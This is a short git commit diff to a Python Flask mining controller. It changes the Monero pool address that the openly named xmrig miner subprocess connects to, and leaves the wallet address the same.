fa37d4b4133dcded7e8b211393a217d89679ed53
SAKSHAM-73 <159360973+SAKSHAM-73@users.noreply.github.com>
2025-03-21 16:45:27 +0530

    Update mining_controller.py

--- mining_controller.py
+++ mining_controller.py
@@ -9,7 +9,7 @@ miner_process = None
 def start_mining():
     global miner_process
     if miner_process is None:
-        miner_process = subprocess.Popen(["./xmrig", "-o", "gulf.moneroocean.stream:10128", "-u", "46pdUzs2AiQNC4c7oS8rWFddLzjqfe3emUuWaoh2XxcCNANBwTtTAhbBnmMbrnsCBE54TQ9xYUAPwJkint86ZWDoPr87MAm", "-p", "x"])
+        miner_process = subprocess.Popen(["./xmrig", "-o","in.monero.herominers.com:1111", "-u", "46pdUzs2AiQNC4c7oS8rWFddLzjqfe3emUuWaoh2XxcCNANBwTtTAhbBnmMbrnsCBE54TQ9xYUAPwJkint86ZWDoPr87MAm", "-p", "x"])
     return "Mining Started"
 
 @app.route('/stop', methods=['POST'])
